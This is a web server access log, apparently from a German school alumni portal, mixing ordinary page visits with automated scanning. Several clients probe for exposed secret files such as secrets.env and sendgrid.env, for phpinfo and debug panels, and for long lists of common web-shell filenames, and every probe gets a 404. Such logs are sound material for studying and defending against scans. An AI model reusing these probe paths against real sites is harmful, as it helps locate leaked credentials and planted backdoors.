5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:44;;/shop/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:44;;/shop/wp-admin/install.php?step=1&language=en_GB;GET;404
6796a37704eea51c511d4e1610212ecd82fdee7cc0166334bc474fb9880e3e8a;2025-11-04 15:59:23;;/personen/alumni/schule/09A05;GET;200
e71ccafeb57248a2e3af5ebcfcbbadf8a10b80fca67ea1e635ae0dc7f0e3270b;2025-11-04 15:59:24;;/;GET;200
fbd3c23d942c3044de11459a40b8b366b8f520c9ed43c5d4bfd8a2df47755cab;2025-11-04 16:08:09;;/personen/alumni/schule/170574;GET;200
941763656a92a3c8f57f6366f2044e85f82daa1a71d06c495db0e44203aa0566;2025-11-04 16:15:42;;/personen/alumni/schule/0348;GET;200
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:38;;/;GET;200
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:38;;/;GET;200
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:39;;/sendgrid.env;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:40;;/sendgrid.env;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:41;;/twilio.env;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:41;;/twilio.env;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:42;;/phpinfo/;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:43;;/phpinfo/;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:43;;/app_dev.php/_profiler/phpinfo;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:44;;/app_dev.php/_profiler/phpinfo;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:45;;/.config.yaml;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:46;;/secrets.env;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:47;;/.config.yaml;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:49;;/secrets.env;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:51;;/debug/default/view?panel=config;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:53;;/phpinfo.php;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:54;;/info/;GET;404
d8f6db52c4371cc986f49e6f79048e26394c9af94e491e6b46c0b002027a315d;2025-11-04 16:17:55;;/test;GET;404
3759e2b654530ee3d7e02d60c3a2b31a5ce6931948eb5ee96870c844b73e10d0;2025-11-04 16:22:47;;/personen/alumni/schule/59026;GET;200
7be5d25c8af3c380fbd82e54ecbdfe74388c88456d0426bbd28bff135161a718;2025-11-04 16:25:24;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
05406ec0d5d653189ba7a580628c3c7901762fd7e469610294260d4a4145bfa1;2025-11-04 16:27:39;/media/system/js/core.js;/media/system/js/core.js;GET;404
05406ec0d5d653189ba7a580628c3c7901762fd7e469610294260d4a4145bfa1;2025-11-04 16:27:39;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
d9be735757d0d53ae77d3a3f9e75d3b84ea49cbddd43ca9fa0e314beed2c6fc3;2025-11-04 16:29:57;;/;GET;200
a5dc4fc2403858d6de28eca83a75629225fb3964010cc847ed3703d2d6211de4;2025-11-04 16:31:05;;/personen/alumni/schule/4340014;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-04 16:31:56;;/personen/alumni/schule/67210;GET;200
c634b15bf489a79a92f46483bc91f4d3105fe5aa76dce0dcd1584c0821e1abd9;2025-11-04 16:38:22;;/personen/alumni/schule/59000;GET;200
ae6d775f20ad97a709ef659775fab0f7fd9e8e646cbf0f84eed671e7030373ec;2025-11-04 16:43:42;;/;GET;200
cf1705286ddf6bc1ecef90d6f59407c1d34438459cb9ea94efbcdc8d5bf1f49b;2025-11-04 16:45:26;;/personen/alumni/schule/65262;GET;200
44a3c91a77ffb6cde3177f9e64cb9274b5b4cb1f83085fe01e2eb1bcfeb27e8e;2025-11-04 16:52:20;;/personen/alumni/schule/5505;GET;200
c59b5785875fab3830ce12bba9d38d3a042465bdfe1a60d14f1e691ed48ab436;2025-11-04 16:59:13;;/personen/alumni/schule/170720;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-04 17:05:41;;/actuator/gateway/routes;GET;404
5df2ecc639bf664c1572f529150e3b86038fe738b2fd104baeabf1b9caaeec41;2025-11-04 17:06:34;;/personen/alumni/schule/4240404;GET;200
9fe5282bf65c62f2e1c888b7990c4fa9553e2ec6987a502f7e7df7ab702c7608;2025-11-04 17:07:00;;/;GET;200
48ada018551f17dd641c7ed6f5cb68209408465fb605beb06182d36a08a1dae3;2025-11-04 17:07:36;;/actuator/health;GET;404
e16e220c7f8976720cfe867ebfd0316870f692cd4802b21098db00f40280d4a6;2025-11-04 17:09:18;;/gruppen/hobby/vogelbeobachtung;GET;200
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:36;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:37;;/031.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:38;;/ilex.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:39;;/flex.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:40;;/222.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:41;;/444.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:42;;/file9.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:43;;/filesss.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:44;;/file88.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:45;;/gifclass4.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:46;;/555.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:47;;/333.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:48;;/hly.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:49;;/d12.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:49;;/2clas.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:50;;/bless5.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:51;;/file15.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:52;;/hk.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:53;;/alpa.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:54;;/file21.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:55;;/ssss.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:57;;/ut.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:12:59;;/inde.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:01;;/classgoto24.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:02;;/030.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:03;;/thh.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:04;;/indo.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:05;;/fileas.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:06;;/yellow.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:07;;/33.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:08;;/plss3.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:09;;/he.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:10;;/thxt.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:11;;/wfile.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:12;;/class20.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:13;;/1.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:13;;/usep.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:14;;/wa.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:15;;/wb.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:17;;/file1.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:17;;/2.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:19;;/a2.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:19;;/a.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:20;;/gmo.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:21;;/info.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:22;;/file2.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:23;;/lv.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:24;;/about.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:25;;/abcd.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:26;;/lock360.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:27;;/alfa.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:28;;/NewFile.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:29;;/atomlib.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:30;;/--.php;GET;404
f68fea91684b992b3a9c7fe848756c4569b3cbf7634b04f24215038738703816;2025-11-04 17:13:31;;/veranstaltungen;GET;200
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:32;;/system_log.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:32;;/pp.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:33;;/geck.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:34;;/gm.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:35;;/makeasmtp.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:36;;/file4.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:37;;/lala.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:38;;/admin.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:39;;/7.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:40;;/file18.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:41;;/ffile.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:42;;/file7.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:43;;/we.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:44;;/gfile.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:45;;/jlex3.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:46;;/des.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:47;;/aaa.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:48;;/gifclass.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:49;;/vee.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:50;;/efile.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:51;;/afile.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:52;;/errorfile.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:52;;/f35.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:53;;/gool.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:54;;/haikh.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:55;;/135.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:56;;/enclas.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:57;;/ioxi-o.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:58;;/wp-admin/js/wp-conflg.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:13:59;;/classwithtostring.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:00;;/image.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:01;;/wp-admin/wp-conflg.php?p=;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:01;;/mail.php?;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:02;;/sx.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:03;;/max.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:04;;/size.php?p=;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:05;;/mpxct.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:06;;/0xx.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:07;;/s.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:09;;/hq.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:11;;/blox.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:13;;/ant.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:14;;/fso.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:15;;/htaccess.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:17;;/wp-trackback.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:17;;/wp-admin/about.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:18;;/readme.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:19;;/v.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:20;;/sck.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:21;;/X7x.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:22;;/xpass.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:23;;/bless.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:24;;/bless2.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:26;;/bless6.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:26;;/bless10.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:28;;/bless11.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:28;;/wp-admin/js/index.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:29;;/thoms.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:30;;/xsas.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:31;;/xrp.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:32;;/wp-freya.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:34;;/css/index.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:35;;/file30.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:36;;/fesa.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:38;;/class-.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:39;;/.well-known/gecko-litespeed.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:40;;/up.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:41;;/403.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:42;;/9v6.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:43;;/lte7.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:44;;/1vbqo.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:45;;/l10n.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:46;;/tajj.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:47;;/fdd2.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:48;;/class9.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:49;;/sto.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:49;;/7h.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:51;;/fh26.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:52;;/ixj.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:53;;/x23.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:54;;/zeu.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:54;;/f2r4.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:55;;/lopst.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:56;;/gecko.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:58;;/0xs.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:14:59;;/Zeiss.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:15:00;;/x0x.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:15:01;;/adin.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:15:02;;/wsz.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:15:03;;/ahy66.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:15:03;;/thai.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:15:05;;/dex.php;GET;404
b0ccbdb9a5134aa37da352fbd0f876536336cf6edaf7b58e5340724ae69fb4ba;2025-11-04 17:15:06;;/zen.php;GET;404
5300c3413f53c2d2d3dd4255da7d8445b85e1e5ac507487ce33a79092a6fe28c;2025-11-04 17:20:41;;/personen/alumni/schule/59013;GET;200
dbb20a649473901f7d0249a97448c0345acf320bf767ac283d0028dd94ffd959;2025-11-04 17:24:19;;/;GET;200
112e2a52d71ec00bd3e73ebb4044457e3b6e7134c15409b1a58f0538df9abef9;2025-11-04 17:27:17;;/personen/alumni/schule/190627;GET;200
c0af24319f8ac7fb3d4739fbdd1b0c088653690e471c501a89550cf1887eb65a;2025-11-04 17:28:35;/themen/details/erfolgreich-durch-die-abiturprufungen;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
b5637485893ee90ac3f02ca5e7e07307d19f06a4f0943a4ec8c2012f0d4116a8;2025-11-04 17:29:30;/;/;GET;200
1c6cafa23c81c9dd701af7b1690b8ba821172f8e0dd49849eb4dae7ac579e658;2025-11-04 17:31:41;;/;GET;200
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:26;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:28;;/wp-blog.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:28;;/webdb.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:29;;/witmmm.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:30;;/18299.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:31;;/zxasd.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:32;;/nxx.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:33;;/shlo.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:34;;/sql.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:34;;/Marvins.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:35;;/wpfile.php;GET;404
b82227fa0aef04a835e399f517d60ccabfacc7bfd34fb70b3e7cb1440ce76259;2025-11-04 17:32:36;;/foyhd.php;GET;404
